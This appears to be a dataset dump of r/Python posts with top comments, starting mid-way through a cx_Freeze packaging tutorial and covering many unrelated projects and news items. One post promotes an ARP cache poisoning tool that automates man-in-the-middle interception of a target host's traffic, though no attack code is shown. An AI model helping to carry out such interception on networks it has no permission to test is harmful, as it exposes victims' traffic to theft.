The following is the frame of this file. The steps of the **setup.by** file are intuitive, but let’s look in more detail. First of all, import two entities: the setup function and Executable class. The most informative is the **options** dictionary (dictionary of dictionaries as it's usually called), which is used to improve the build. It may have such parameters:

* **excludes** – list with description of modules not to be included in the assembly. You shouldn’t overuse this parameter, since you can overdo and delete what you really need: nested dependencies.
* **includes** – parameter opposite to excludes, that’s the list of signal modules that must be included in the assembly. Also cx\_freeze may not find some packages or modules, in particular if they were imported into similar package using the import function. If you have a GUI application, you have to specify the name of the script with the \*.py extension, in our case it’s **MainForm**.py.
* **packages** – compulsory packages to be included.
* **zip\_include\_packages** – list of packages to be archived
* **include\_files** – list of lines or files tuples that need to be added to the assembly, but these are not Python files.

Now let's take a closer look at the Executable class:

* **targetName** allows you to specify the name of the \*.exe file, by default it matches the name of the launching script.
* **base** = **‘Win32GUI’** If you set a parameter as described in the example, it means that the graphical application is processing and the console window will not appear.
* **icon** – parameter to set the icon of the application launcher, by default uses pictures with \*.ico ext.

&#x200B;

    # -*- coding: utf-8 -*-
    
    from cx_Freeze import setup, Executable
    import os
    options = {
    'build.exe': { 'icludes': ['MainForm'], 'packages': ['pandas'], 'excludes ': excludes } }
    os.environ['TCL_LIBRARY'] = r'C:\Users\User3\Anaconda3\tcl\tcl8.6'
    os.environ['TK_LIBRARY'] = r'C:\Users\User3\Anaconda3\tcl\tk8.6'
    setup(
    name = ""TextTool"", version = ""0.0"", description = ""Here write smth"", options = options, executables = [Executable('TextToolS.py', targetName = ‘ThisIsName.exe’)])

To compile you need to run the setup.py file. To do this, enter the following code via the command line from the project directory:

    python setup.py build

After that you will see the launch of the project build.

&#x200B;

[Figure 7 – Running project build](https://preview.redd.it/jgtrlj6khxe21.jpg?width=655&format=pjpg&auto=webp&s=480540ce993a8208c81fce78d18c3413149f8f9b)

Building a project can take from 10 seconds to several minutes, depending on the size and number of interconnected modules in your application.

Not always the project build runs smoothly, let’s look at some of the most common mistakes. Most of them can be solved by searching and writing in the correct parameters of the setup function in the setup.py file, but often due to laziness or lack of time, the temporary ways are implemented to solve this problem. For example, this one, when you haven’t specified the module’s addition:

&#x200B;

[Figure 8 – Error example](https://preview.redd.it/dx9fl0glhxe21.jpg?width=873&format=pjpg&auto=webp&s=3955eff4159f0fdff1a670fe7d664e05f11a5cce)

    ""Missing required dependencies {0}"".format(missing_dependencies))
    ImportError: Missing required dependencies ['numpy']

To make this just copy \_methods.py file from Anaconda library

…\\Anaconda3\\Lib\\site-packages\\numpy\\core

to numpy folder ‘core’, located

…\\build\\exe.win-amd64-3.6\\lib\\numpy\\core.

&#x200B;

[Figure 9 – First type error fix](https://preview.redd.it/jd0b7ufnhxe21.jpg?width=794&format=pjpg&auto=webp&s=3f7e9f296b4f18d85b7466810e16af8af6527de6)

The second common mistake is undersampling hidden dependencies. It’s possible that you didn’t see the hidden dependencies of the packages and didn’t add it. Often the problem occurs with packages like idnadata

&#x200B;

[Figure 10 – Second type error](https://preview.redd.it/46jgu19ohxe21.jpg?width=800&format=pjpg&auto=webp&s=e60341d7b67b77cad604b95cbcfb313ddc1edd69)

    File ""C:\Users\User3\Anaconda3\lib\site-packages\tldextract\__init__.py"", line 3, in <module>
    from .cli import __version__
    File ""C:\Users\User3\Anaconda3\lib\site-packages\tldextract\cli.py"", line 14, in <module>
    from .tldextract import TLDExtract
    File ""C:\Users\User3\Anaconda3\lib\site-packages\tldextract\tldextract.py"", line 62, in <module>
    import idna
    File ""C:\Users\User3\Anaconda3\lib\site-packages\idna\__init__.py"", line 2, in <module>
    from .core import *
    File ""C:\Users\User3\Anaconda3\lib\site-packages\idna\core.py"", line 1, in <module>
    from . import idnadata
    ImportError: cannot import name 'idnadata'

The algorithm is the same, you find the missing file in the folders of the installed libraries and copy it in the appropriate folder of your assembly. This’s win-win option if you need a quick compilation for testing.

From …\\Anaconda3\\Lib\\site-packages\\idna to …\\build\\exe.win-amd64-3.6\\lib\\idna

&#x200B;

[Figure 11 –Second type error fix](https://preview.redd.it/exn2z8tphxe21.jpg?width=692&format=pjpg&auto=webp&s=2963ac8ae8552f8295d824068ad19c9d7578c062)

In general, the advantages of cx\_Freeze are:

* Startup files for Linux
* MSI installers for Windows
* RPM packages for Linux
* Software packages for Mac OS X (.app, .dmg)

The disadvantages are:

* No possibility to pack all python-modules and dll-files in one exe-file
* No cross compilation

# Conclusion

In this article we have looked at the principles of creating a GUI application in Python using PyQt and compiling the created app to \*.exe by means of cx\_Freeze. I hope you enjoyed this article, if you have any questions, please contact [tina.ward@mail.uk](mailto:tina.ward@mail.uk).","pysimplegui is a newcomer but quite useful. There is also QT for Python (pyside2) which I see people describe as better than PyQT5 but I haven't found out why yet

Edit: mostly the easier to work with license, otherwise they are very similar

Edit: I've also worked a bit with sciter, which has the benefits of designing a UI with web tech without the resource hogging of a library like Electron. Currently the python binding is only really meant to bridge it with sciter's native scripting language but I have a half finished patch for binding the rest of the functionality. I'm then planning to built a React-like library for Python to use on top of that"
Happy 1600000000 seconds since epochs everyone!,is6et5,2020-09-14 04:47:01,"I just converted a timestamp and was surprised to see 1600029670

As of Sunday, September 13, 2020 12:26:40 PM UTC, we moved up.

The last change was July 14, 2017, when we stepped into the 1500000000's

In case you don't believe me, check it yourself 😂

    import time
    time.time()",Happy GNU year!
Deepnote – a Python notebook with real-time collaboration in the browser. We just opened the platform to the public.,jkw8tr,2020-10-30 20:57:31,,"Fascinating stuff, I will definitely use it for my next project.

Question: are you building this on top of existing projects like jupyter-rtc? Or is this is completely written in-house?"
"*for fun* (3months coding experience, just learning the ropes) I made a simple tkinter GUI that keeps track of your current weed, total grams bought, and total spent, and how much you bought and smoked each day. it exports the data to be viewed in an excel file.",fqnmbt,2020-03-29 00:43:33,,The colours look like Hulk.
Automate the Boring Stuff with Python (2nd edition) is coming soon!,desohg,2019-10-08 08:52:01,"Attention Fans of Al Sweigart's books such as Invent Your Own Computer Games with Python and Cracking Codes with Python:

Al just announced that the second edition of Automate the Boring Stuff with Python is coming soon (and is available for preorder).

It's almost 600 pages long now (100 pages longer than the first edition), includes a ton of new content (Working with Google Sheets, EZGmail, SMS email gateways, and Mu editior), and more than a handful of new projects (I'm especially excited about Zombie Dice!).

I'm looking forward to it, and if you're interested in practical application of Python, you might want to check it out!

[https://inventwithpython.com/blog/2019/10/07/whats-new-in-the-2nd-edition-of-automate-the-boring-stuff-with-python/](https://inventwithpython.com/blog/2019/10/07/whats-new-in-the-2nd-edition-of-automate-the-boring-stuff-with-python/)",I have the first one. Cool book. I’m curious about the Google sheets portion..
"First post here, thought you guys might like this. I've been working on an electrical thruster for small satellites for my Master Thesis, counting the ignitions with some Python scripts (+webcam) I wrote. (note the super high-tech hardware setup)",c67pxe,2019-06-28 00:36:25,,Science ranking 10/10 for literally using legos in testing tech for satellites
I built a web scraper to notify you of cancellations at fully booked campsites in Yellowstone National Park,mteoc0,2021-04-18 23:13:38,"**TLDR**: The [tool is hosted on GitHub](https://github.com/juftin/yellowstone-camping), scrapes the [Yellowstone Campsite Availability](https://secure.yellowstonenationalparklodges.com/booking/lodging) API, and sends push notifications to your mobile device when a campsite becomes available.


**UPDATE**: This project was expanded to search Yellowstone and all of [recreation.gov](https://recreation.gov) (thousands of campgrounds all over the USA). More info at [github.com/juftin/camply](https://github.com/juftin/camply).

My partner and I are taking a trip this summer (July, 2021) from home in Colorado through Wyoming to Glacier National Park. Like all national parks right now, the campsites in Glacier are a hot commodity and tough to come by.

To help us get an advantage in finding a site we signed up for [*Campnab*](https://campnab.com/), a service that lets you sign up for text notifications when booked out campgrounds receive cancellations. Long story short, it's totally worth it I have nothing but great things to say about it. We found a 5 day cancellation and booked our first choice campground within a couple weeks of signing up for text alerts.

On our way home from Glacier we'll be going through Yellowstone and Grand Teton National Park. Unfortunately, Campnab doesn't (currently) work for most sites in Yellowstone, since they use a different booking provider than the rest of the National Park System. Instead, I decided to play around with the booking website and build my own integration with their API. It runs in a docker container, and sends push notifications through [Pushover](https://pushover.net/).

Feature Requests and Technical Feedback / Questions are best done though the [Issues Page](https://github.com/juftin/yellowstone-camping/issues). Some basic command line skills and an always-on computer are required to run this.

We're still waiting for our Yellowstone spot as of writing this and can't wait to get back there this summer. I hope this tool is useful for someone out there, good luck hunting for your next spot!

[**Source Code/Documentation on Github**](https://github.com/juftin/yellowstone-camping)","> We're still waiting for our Yellowstone spot as of writing this 

Your heart is in the right place but you might want to get a spot before you release the code lol."
Flask has overtaken Django according to the 2018 JetBrains Developer Survey,ao5dml,2019-02-08 00:18:51,,\*sits in corner playing with pyramid\*
"""Python is becoming the world’s most popular coding language"" via The Economist!",9lwk7u,2018-10-06 23:00:28,,What would you expect when it is the language taught the most now? It was Java first but now universities are teaching Python. Happy to see C  is still up there outside the US. Beautiful.
"Self taught coders with no degree who landed a good job by working hard, tell me your process.",pa0a76,2021-08-23 21:53:32,"Hello fellow coders. I’ve been on a slump learning and teaching myself how to code. I am at a point in my life where this is my only way out but I have been stuck on finding the motivation. How hard is it to land a job after teaching yourself how to code?

Edit: Holy crap I did not expect this post to blow up. So much great information and tips coming from the lot of y’all’s. In hindsight I should’ve also asked how long it took to get where you are.","I've been working full time as a developer for 6 years. The last thing I graduated from was middle school.

The hardest part is definitely landing the first job. After that you have your previous work history to prove that you can get it done. I was fortunate enough to get an internship doing QA automation, making $16/hour with 0 benefits. I found out later that I was the only applicant who both showed up to the interview sober and had any programming experience. After a year of working there I saw an add on Stack Overflow for a position that was looking for someone with my exact skillset. I reached out to them, heavily emphasizing, in my cover letter, that I had spent the last year solving the exact problems that they were struggling with. HR, was hesitant because the lack of credentials, but as soon as I started talking to the technical staff the interview process was challenging but OK.

I'm seeing more and more companies explicitly state that they're willing to hire people without credentials or certifications if they have other ways of proving that they'll be a productive member of the team. Credentials are a great way of doing this. Without them you have to fabricate a portfolio of work to show off what you can do. Blog entries, toy projects, and open source contributions are all good ways of demonstrating your accomplishments.

Best thing to do is write a lot of code and be able to talk intelligently about what you did and the mistakes you made, and learned from, along the way. Don't worry too much about picking the right project or language. Find something that you enjoy working on and keep iterating on it as you learn.

Best of luck. :)"
Finally switch- case is coming to python.,mzinii,2021-04-27 15:04:56,"No more ""where is switch case in python?""

In the python 3.10 release according to the accepted PEP634,635,636 Match-Case statement will be added which is similar to Switch-Case statements in other languages. Match case is structural pattern matching which will match 'cases' against the subject value 'match'. 

[https://blog.electroica.com/switch-case-is-match-case-python/](https://blog.electroica.com/switch-case-is-match-case-python/)","Finally I can stop searching ""python switch case"" and then realizing that I don't remember the syntax because it doesn't exists."
"Since you guys loved my previous project, here is another one where i used same CNN to control RC car running on Arduino as server and python as client with Rock,Paper,Scissors gestures.",haje4i,2020-06-17 11:45:58,,Any plan to make this open source? I’d love to see how this works
I made a script to skip youtube ads!,k8yv7b,2020-12-08 14:06:55,"[https://github.com/reddtoric/SkipYTAds](https://github.com/reddtoric/SkipYTAds)

# SkipYTAds

Hate YouTube ads **but don't want to use an ad blocker**? **You don't mind those ads because some are good or introduces you to new things but you don't want those extra long annoying ones?** Well, here's a python script just for that!

This python script automatically searches for the skip button every 6 seconds (adjustable) and if there is a skippable ad, it'll skip it for you. And if you're in the middle of watching a skippable ad but interested in continuing, just press the pause button (before it does  it's thing) and it'll pause the script. Then returns your cursor back to where it was (but does not refocus your original window; a desired  feature possibly added).

[Readme](https://github.com/reddtoric/SkipYTAds) file in repo

---

**Edit:** Since some have questioned things that are stated in the Readme.

[Readme](https://github.com/reddtoric/SkipYTAds)'s Table of content

- Prerequisites  
  *To do. Python 3?
- Running the script
- Pausing/Unpausing the script
- Verbosity Modes
- Adjustable Interval
- Running multiple monitors? (like me)
- Compatibility
- Other settings
- Ad not skipping? Want script to match other images to click?
- Features to implement (if I feel like it)
- Libraries used
- Dev Note (See below)


And to answer and respond to those that say it's overkill or better solutions or whatever it may be:

### Dev note:

**This script may be clunky and not robust but it works to my specs. I wanted something that clicks the button for me when I'm doing stuff and have a video playing.**

It doesn't work while in a game that centers your cursor and not allowing it outside of the window which I'm okay with.

**I don't use ad blockers because I actually like to see some of the ads.** But other ads like an ad of a tutorial on a brand of smart lights that is several minutes long is extremely displeasing. I DON'T OWN ANY. Why is an ad showing me how to use smart lights!? Just assuming that it's popular or everyone owns them.","Suggestion for an improvement: yt ads are able to be sped up. Just running this js in your address bar whilst the ad is running will speed it up AND speed up the time until the skip shows.

    javascript:(function(){let x=document.querySelector('video');x.playbackRate=10;})();

Instead of 6 seconds, you can skip after 0.6 seconds with this, again, should still give the creators the same ad money as if you used nothing at all"
A little python program I wrote that finds the current song playing on my Spotify account and then uses web scraping to display the lyrics.,b3dbh6,2019-03-20 23:24:33,,"That's awesome, source code?"
Machine Learning from Scratch with Python,xe2mzy,2022-09-14 21:55:21,"Hey everyone!

I've seen a growing number of people looking for resources on how to implement Machine Learning algos from scratch to better understand how they work (rather than just applying e.g. sklearn).

**This free** [**Machine Learning from Scratch Course**](https://www.youtube.com/watch?v=p1hGz0w_OCo) on YouTube takes you through writing 10 algorithms from scratch with nothing but Python and NumPy! The algorithms are:

1. K-Nearest Neighbors
2. Linear Regression
3. Logistic Regression
4. Decision Trees
5. Random Forest
6. Naive Bayes
7. PCA
8. Perceptron
9. SVM
10. K-Means

Hopefully some of my Python + ML friends will find this helpful! :)","I’ve been looking for something like this forever!  Every machine learning tutorial or course starts out like it’s going to teach from scratch but it always ends up being about how to use PyTorch / TensorFlow / whatever.  I know I won’t be able to do it from scratch anywhere near as well as those libraries have, but I want to understand what’s going on"
The most WTF Python code I've ever seen,pqs9au,2021-09-19 02:57:32,"[Link to source thread](https://www.reddit.com/r/learnprogramming/comments/kegalv/my_first_python_script_coming_from_c_feedback/)

https://preview.redd.it/uwl236w16bo71.png?width=304&format=png&auto=webp&s=7ca0f2d4ed7bfa68c74fcfe828f4671678c75e14

printf, braces? How does this even work. Seriously, it looks like someone wrote C in Python?","    #include <stdint.h>
    #include <stdio.h>

they knew what they were doing 

and it is beautiful"
I made a program that will help you find deep learning AI projects and pre-trained models!,cq53v4,2019-08-14 13:10:21,,"I'm planning on working with AI pretty soon, so I thought a tool like this might come in handy. I wrote in about an hour so it may be a little sloppy but I'll fix as I find bugs. Anyways I released it on pip to make it easily installable for anybody doing AI training. It displays some pretty menus with terminaltables and should be a useful resource for anybody who wants to quickly find a model or project. Hope you find some use in this!

Github: https://github.com/M4cs/EasyModels"
A piece I did to commemorate the end of my python course. I was told you lot might enjoy!,9f4fb6,2018-09-12 11:56:32,,I think you took a woodworking course.
I teach python for middle and high schoolers – I made this little trophy for a competition of who could make the best image using Turtle/Python,ti7uyh,2022-03-20 07:31:44,"I will also make some keychains with the best images 3d-printed on them – I hope the students like them!

&#x200B;

https://i.redd.it/7cyldg3odfo81.gif","Looks great, I wish I had such an ambitious teacher in middle school."
"I built a solar-powered crypto ""mining rig"" using a Raspberry Pi and Python",nao3cf,2021-05-12 21:00:22,"Full tutorial is [available on Hackster](https://www.hackster.io/rob-lauer/solar-powered-crypto-mining-with-raspberry-pi-64adee).

So this project was a blast, if not incredibly impractical.

[My Raspberry Pi 4 + PiJuice HAT + Notecarrier\/Notecard HAT](https://preview.redd.it/ldm619u9toy61.jpg?width=800&format=pjpg&auto=webp&s=dcd16db23b566fd3e8038ddbbc6d8b2f3aa55686)

tl;dr - don't expect a Raspberry Pi to generate you more than a few pennies (even on solar!).

I took existing OSS tools for CPU mining of Monero and wrote a Python script that would regularly scrape the log file generated...then report data from that log file to a cloud dashboard using cellular (making this nearly an off-grid solution as well).",">To accomplish this, I'm going to use the Notecard from Blues Wireless. It's a cellular and GPS-enabled device-to-cloud data-pump that comes with 500 MB of data and 10 years of cellular for $49

Any more info on this? I see the link for the card, but what about the ""10 years of cellular for $49"" part?"
Why have I not been using f-strings...,iwdzzx,2020-09-20 21:37:57,I have been using format() for a few years now and just realized how amazing f strings are.,I know I haven't been using them because most of the projects I work on need to support older versions of Python than 3.6. F-strings are like a little treat when I can work on a project with no legacy support requirements.
Snake game in a single line of python,idxmnt,2020-08-21 22:22:06,"This is a fully functional game of snake in a single line of python using pygame. I did this mostly as a challenge to myself to see how compact I can make code, similar to code golf. I got it down to less than 3K characters, but I could easily get much less by shortening variable names.

[source code](https://github.com/tjf801/oneliners/blob/master/snake.py)

edit: some bug fixes made it go over 3K chars","PEP: ""Screaming noises"""
I'm banned for life from advertising on Meta. Because I teach Python,17bdxxa,2023-10-19 16:03:37,,"> Meta thought that he was dealing in live animals, which is forbidden.

> that’s right: I teach courses in Python and Pandas. Never mind that the first is a programming language and the second is a library for data analysis in Python. Meta’s AI system noticed that I was talking about Python and Pandas, assumed that I was talking about the animals (not the technology), and banned me. The appeal that I asked for wasn’t reviewed by a human, but was reviewed by another bot, which (not surprisingly) made a similar assessment.


OMFG."
Learning Python and found this great resource,qcvvs6,2021-10-22 00:40:28,"I am studying python algorithms and found this excellent resource. It covers many of the basic python algorithms that would be learned in an algorithm course, additionally more resources to conceptualize how to implement assignments in python such as quantum algorithms, project euler solutions, networking, machine learning solutions, graphics, and geodesy, digital image processing, ciphers, and cellular automata implemented in python.

Here is a link to the implementations:

https://github.com/TheAlgorithms/Python",">It covers many of the basic python algorithms that would be learned in an algorithm course

This is a lot more material than just a single semester.  This is an incredible amount of information.  Thanks for sharing."
I made an Inventory GUI,cifyi7,2019-07-27 18:28:27,,source code: https://github.com/pokepetter/ursina/blob/master/samples/inventory.py
Python performance comparison in my project's unittest (via Gitlab CI/CD),gtgsot,2020-05-31 00:18:14,,[Here's the project](https://gitlab.com/prettyetc/prettyetc)
Web Scraping with Python: Everything you need to know to get started (2022),uqabuy,2022-05-16 00:58:56,,Does include some explanation of why scraping doesn't always work and why sometimes you need a 'headless browser.' Understanding when to use BeautifulSoup and when to use Selenium is crucial to effectively extracting data from web sites. The entire process of scraping becomes a frustrating a time-suck without that.
I wrote simple converter image to ascii(again?) and render it into picture.(source code in comments),eu5zb4,2020-01-26 20:13:38,,"if you're looking for a challenge: try edge detection and the outline characters ( /, \\  _ ~ ) for a more hand-made look."
What's a Python feature that is very powerful but not many people use or know about it?,v1rde4,2022-05-31 22:20:28,,Generator expressions.
Why do people still pay and use matlab having python numpy and matplotlib?,u6bcgc,2022-04-18 19:54:34,,Simulink. One can use Matlab to build a digital controller straight from the model and install it on one of the modern PLC’s.
I have created a new Python package for web scraping and analysis of stock market data.,k3awea,2020-11-29 23:11:47,,Pros/cons compared to `yfinance`?
Python 3.12: A Game-Changer in Performance and Efficiency,11gvo6m,2023-03-03 16:38:56,,Pathlib finally getting a walk method
Normally I teach Python as a CS professor. Now I’m developing a programming game where you can apply your Python skills to different coding challenges.,zqpnm5,2022-12-20 22:15:29,"Game-based learning is a great way to practice programming skills, if it is actually fun and a challenge. So I started developing a game / simulation, where my students could practice their Python skills in all kinds of environments (mostly robotics, abstract algo & ds problems, and some machine learning / image processing tasks).

Now for the last 18 months I’ve been developing this prototype into a proper game, that's hopefully useful and fun to a larger audience. I'm solo-developing this in my spare time, so it's still very much a work in progress. Please let me know what you think, you can find more details on the game’s Steam page: 

[https://store.steampowered.com/app/2216770/JOY\_OF\_PROGRAMMING\_\_Software\_Engineering\_Simulator](https://store.steampowered.com/app/2216770/JOY_OF_PROGRAMMING__Software_Engineering_Simulator)

Edit: Thank you so much for your interest. Since there are several request to join an early playtest you can sign up here: [https://prof-scherer.de/joy-of-programming/](https://prof-scherer.de/joy-of-programming/) I plan to start the next playtest sometime in January.","I have some programming students (ages 11 and 13). I'd be happy to test your system out with them and give you feedback. I'm not really happy with educational minecraft resources or Scratch as my experience has been that students that age (10-15) can already learn Python soooooo, why not teach Python?

If having alpha testers is something useful for your project, send me a pm."
SQLModel: SQL DBs based on Python type hints. The biggest thing I've built since FastAPI and Typer. 😅,pawqhw,2021-08-25 05:27:07,"I just released SQLModel ✨

[https://github.com/tiangolo/sqlmodel](https://github.com/tiangolo/sqlmodel)  


This is the biggest thing I've built since FastAPI and Typer... 😅  


SQLModel is a library for interacting with SQL DBs, based on Python type hints.

Each model is both a Pydantic and SQLAlchemy model, and it's all optimized for FastAPI. 🚀

More info in this Twitter thread: [https://twitter.com/tiangolo/status/1430252646968004612](https://twitter.com/tiangolo/status/1430252646968004612)

And the docs are here: [https://sqlmodel.tiangolo.com/](https://sqlmodel.tiangolo.com/)","This is great, but I love how it's labelled ""Intermediate Showcase"".

I guess I'll be a beginner until the day I die haha"
"I'm the author of Rich and Textual, two highly starred Python projects on Github. AMA",p0ffe2,2021-08-08 22:16:51,"Rich has 27.K stars, and Textual has 1.5K.

I've released a new version of Textual, and I'm keen to get feedback, but feel free to AMA about any of my projects or Python development.

[https://github.com/willmcgugan/textual](https://github.com/willmcgugan/textual)

[https://github.com/willmcgugan/rich](https://github.com/willmcgugan/rich)

\--

**Thanks everyone**. Tweet [@willmcgugan](https://twitter.com/willmcgugan) if you have any more questions!","Hey Will - you are just tearing it up with these libraries, congrats!!!

I was thinking of using Textual to make an ASCII box diagrammer, to make it easier to create code comments like this state diagram:

    

           +----------+
           | PowerOff |
           +----------+
               ^ |
              power
               | |
       +---------|-------+
       | PowerOn |       |
       |         v       |
       |   +---------+   |
       |   |  Idle   |   |
       |   +---------+   |
       |    |      ^     |
       |   run    stop   |
       |    v      |     |
       |   +---------+   |
       |   | Running |   |
       |   +---------+   |
       +-----------------+"
Python is the 2nd most popular language on GitHub,75slcp,2017-10-12 06:15:21,,"numpy, scipy, matplotlib, opencv-python, jupyter, and pyqt5 are all I need."
I wrote a script to monitor COVID cases in a specific country and send travel recommendation to WhatsApp (less than 50 lines of Python),id6dq7,2020-08-20 16:21:47,"Hey,

So one of my friends wanted to go to Japan, but he was worried about the COVID situation. He was checking the [number of confirmed cases](https://coronavirus.jhu.edu/map.html) daily to see when they start to go down. I decided to write a piece of Python code to automate it.

This is [the code](https://github.com/seamless-io/templates/tree/master/monitor_country_covid_status). It turned out to be less than 50 lines.

And this is [this blog post](https://medium.com/seamless-cloud/monitor-covid-cases-using-python-in-less-than-50-lines-of-code-810e9b7ab56c) with a more detailed explanation of the code.

Disclaimer: I'm the creator of one of the services mentioned in the blog post (https://www.seamlesscloud.io/). But the code is just Python so you can use it however you want.","I can give you the only sane COVID travel recommendation in 1 line of python: 

    print(""DON'T!"")"
"100 Python books, categorized and ranked",6n9kbj,2017-07-14 23:00:55,,Just finished reading the python crash course book. It s excellent. Very well explained and easy to understand especially if you already know java or c
I wrote a Python package to do adaptive sampling of functions in parallel [OC],b8xk3a,2019-04-03 20:52:22,,"When evaluating a function numerically we would like to sample it more densely in the interesting regions instead of evaluating it on a manually-defined homogeneous grid. 
Together with my colleagues, we wrote an open-source Python software package Adaptive that evaluates the function at the optimal points by analyzing existing data and planning ahead on the fly.
With a few lines of code you define your goal, evaluate functions on a computing cluster, and live-plot the data.
It performs averaging of stochastic functions, interpolation of vector-valued one and two-dimensional functions, and one-dimensional integration.
In my work, using adaptive resulted in a ten-fold speed increase over using a homogeneous grid, going from three months on 300 cores to only a week!

See (star) the repo on [github.com/python-adaptive/adaptive](https://github.com/python-adaptive/adaptive) and the documentation on [adaptive.readthedocs.io](http://adaptive.readthedocs.io).

Try `pip install adaptive[notebook]` or `conda install adaptive` :-)

P.S. adaptive has already been used in several scientific publications, see the [gallery](https://adaptive.readthedocs.io/en/latest/usage_examples.html)!

"
"I made a video for my students explaining our recent end-to-end ML project (from data source to live website). Thought you folks might find it useful. Please let me know if anything’s confusing, incorrect, or could be done better!",jzlb1w,2020-11-24 00:52:33,,"From: Data

To: Otaku"
I wrote my first python+flask web app 😊! Mood-based playlist generator and analyzer (Spotify).,mo4ue0,2021-04-10 21:37:32,"It has begun as a small Spotify api testing thing. I have tried to figure out how these api http requests work and decided to go for the sportify api. Which, I have to say isn’t very beginner friendly. However, after roughly 6 months of working on it, I finally did it and I released a working draft on [Heroku](https://marcify.herokuapp.com).

https://preview.redd.it/dke43y62ncs61.png?width=852&format=png&auto=webp&s=4b2df3d4f9c966f11e1be5ecccd1caf6b8319903

https://preview.redd.it/937a6uavmcs61.png?width=1067&format=png&auto=webp&s=6f8309ecd61a850e7674ca61825d92d743ae7dd2

I am absolutely happy about my result, because I have never thought it would be possible for me. I started my python journey 1.5 years ago. I don’t have that much time, but I try to spend as much as I can to learn something new regarding Python. This particular project here helped me a lot to understand api calls and http request methods and improved my very little knowledge about html and css. I also did an online beginner course in JavaScript. The JS part was the most time-consuming part for me and mostly done by trial and error.

The source code is available on [GitHub](https://github.com/marwonn/spotify-playlist-generator-analyzer).

Since I started learning Python I have been just a reader of this reddit group, but it is absolutely great what super useful insights one can get here. Thanks to the community!

Cheers

\*\*\*Edit on 2021/04/13\*\*\*

Thanks to all of you for your overwhelming feedback!! I highly appreciate it and it is really, really motivating me to keep going with my Python journey.","That's a really cool project you have here. Definitely not beginner, I'd say. It's more complex than most of what gets posted in this sub with the 'intermediate showcase' tag."
Our bot scraps Udemy Coupons and then automatically enrolls you to those paid courses for FREE.,jp8yze,2020-11-07 01:10:02,"There was a post about it last month [here](https://www.reddit.com/r/Python/comments/izrjbc/i_made_a_python_bot_that_scrapes_udemy_coupons/) and since then we've massively improved the code. 

We've added reusable code, fixed browsers (well, firefox still needs a manual intervention), streamlined the process to be interactive in the terminal, introduced partial CI/CD via github action, integrated styling bot, started using a package manager (Poetry), fixed the zip code issue, and made some more changes which will make it easier to contribute (cleaning up README massively comes to mind, it previously used HTML).

Hope you will like the project, the code is [here](https://github.com/aapatre/Automatic-Udemy-Course-Enroller-GET-PAID-UDEMY-COURSES-for-FREE).","You want to enroll courses without looking at what they consist of? Use this bot. Else, just go to the website that the bot scrapes and see what courses you really want and enroll.

This seems more like free ad for udemy.

If you use OP script, make sure it doesn't mess with your saved credit cards in your browser."
I feel so valued,cemtlr,2019-07-18 10:55:20,"Today my coworker asked me to help him with something.  Basically, we had a bunch of gift cards that were supposed to be for employee giveaways, but they were all about to expire. We had about 100 of them.  These gift cards were only redeemable as a guest user so we couldn't just log in to the website and load them all into one user.  We had to perform a separate order for every single gift card.  The worst part is none of the form data was saving in my browser either, so I had to fill in the shipping information manually.  The whole order process took 5 minutes per card.  If done manually, that is..

&#x200B;

I've never used selenium before but I figured this was literally the perfect task, since the orders were all the same save for the gift card codes.  I told my coworker to just help me type out all the codes into a text file and told him I would take it from there.  20 minutes later I had written up a selenium script that ran through the list of codes and performed the orders.  I let the script run for about 15 minutes and we were done!  

&#x200B;

Easily a 2 hour task for two people done in 40 minutes by one! Thanks python.","I similarly had a huge data entry gig which I had done with python, without any prior experience with selenium. After completing it I was also over the moon."
I use single quotes because I hate pressing the shift key.,t6njyc,2022-03-05 01:01:52,"Trivial opinion day . . .

I wrote a lot of C (I'm old), where double quotes are required.  That's a lot of shift key pressing through a lot of years of creating and later fixing Y2K bugs.  What a gift it was when I started writing Python, and realized I don't have to press that shift key anymore.

Thank you, Python, for saving my left pinky.",I use single quotes for things like dictionary keys. Double quotes for printed strings in case I need to include an apostrophe.
"I made an ARP Cache Poisoning tool that automatically sets up a Man-in-the-middle attack on a target host, intercepting its internet traffic. It only uses Python 3.x built-in libraries.",k7u8a0,2020-12-06 22:00:25,"Initiating a Man-in-the-middle (MitM) attack usually requires setting up information on the target host and gateway, as well as executing the attack against each one individually. On top of that, doing this in Python is often portrayed as requiring third-party libraries in many books and tutorials out there.

This tool makes exclusive use of built-in Python 3.x libraries and automatically reads all the information required to initiate the attack, requesting from the user nothing but the target's IP address (as long as it belongs to the same network segment as the attacker, as is the case of any ARP spoofing attack).

Use this tool to assess the security controls implemented on your own networks, test Intrusion Detection Systems you may have set up or simply expand your knowledge on cybersecurity and Python programming in general.

This is a continuation of the building of a pure-Python tool set I announced previously with my [Network Packet Sniffer](https://github.com/EONRaider/Packet-Sniffer). This time we make use of design patterns such as command and proxy, query networking information from kernel routing tables and perform the usual operations with ctypes.

The code is available on GitHub and open to pull requests. Make good use.

[https://github.com/EONRaider/Arp-Spoofer](https://github.com/EONRaider/Arp-Spoofer)","Very cool and impressive, thank you for sharing! I am going to clone and play with this today! I really want to see how it compares to using Ettercap's ARP spoof+MitM tool."
"""Automate the Boring Stuff with Python"" online course is free to sign up for the next few days with code AUG2021FREE",ovth3f,2021-08-01 22:50:27,"https://inventwithpython.com/automateudemy (This link will automatically redirect you to the latest discount code.)

You can also click this link or manually enter the code: AUG2020FREE (uh, I forgot what year it was and it doesn't let me change it: the code is 2020 not 2021)

https://www.udemy.com/course/automate/?couponCode=AUG2020FREE

This promo code works until the 4th (I can't extend it past that). Sometimes it takes an hour or so for the code to become active just after I create it, so if it doesn't work, go ahead and try again a while later. I'll change it to AUG2021FREE2 in three days.

**I'm also working on another Udemy course** that follows my recent book ""Beyond the Basic Stuff with Python"". So far I have the first 15 of the planned 56 videos done. You can watch them for free on YouTube:

https://www.youtube.com/watch?v=kSrnLbioN6w&list=PL0-84-yl1fUmeV_2bBSguF_S0TVZk8wow&index=1

Udemy has changed their coupon policies, and I'm now only allowed to make 3 coupon codes each month with several restrictions. Hence why each code only lasts 3 days. **I won't be able to make codes after this period**, but I will be making free codes next month. [Meanwhile, the first 15 of the course's 50 videos are free on YouTube.](https://www.youtube.com/watch?v=1F_OgqRuSdI&list=PL0-84-yl1fUnRuXGFe_F7qSH1LEnn9LkW)

Side note: My latest book, [The Big Book of Small Python Projects](https://inventwithpython.com/bigbookpython/), is out. It's a collection of short but complete games, animations, simulations, and other programming projects. They're more than code snippets, but also simple enough for beginners/intermediates to read the source code of to figure out how they work. The book is released under a Creative Commons license, so it's free to read online. (I'll be uploading it this week when I get the time.) The projects come from this [git repo](https://github.com/asweigart/pythonstdiogames).

**Frequently Asked Questions:** (*read this before posting questions*)

